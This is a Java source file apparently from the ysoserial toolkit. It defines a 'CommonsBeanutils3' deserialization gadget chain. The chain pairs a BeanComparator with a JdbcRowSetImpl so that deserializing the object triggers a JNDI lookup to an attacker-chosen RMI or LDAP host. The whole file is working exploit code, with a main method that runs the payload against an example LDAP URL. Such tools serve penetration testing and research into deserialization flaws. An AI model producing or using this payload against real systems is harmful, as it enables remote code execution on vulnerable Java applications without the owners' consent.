package ysoserial.payloads;


import com.sun.rowset.JdbcRowSetImpl;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.math.BigInteger;
import java.util.PriorityQueue;

@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-collections:commons-collections:3.1"})
public class CommonsBeanutils3 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String jndiURL = null;
        if (command.toLowerCase().startsWith("jndi:")) {
            jndiURL = command.substring("jndi:".length());
        } else {
            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
        }

        BeanComparator comparator = new BeanComparator("lowestSetBit");
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiURL);
        rs.setMatchColumn("foo");
        PriorityQueue queue = new PriorityQueue(2, comparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        Reflections.setFieldValue(comparator, "property", "databaseMetaData");
        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = rs;
        queueArray[1] = rs;
        return queue;
    }

    public static void main(String[] args) throws Exception {
        args = new String[]{"jndi:ldap://127.0.0.1:1664/obj"};
        PayloadRunner.run(CommonsBeanutils3.class, args);
    }
}
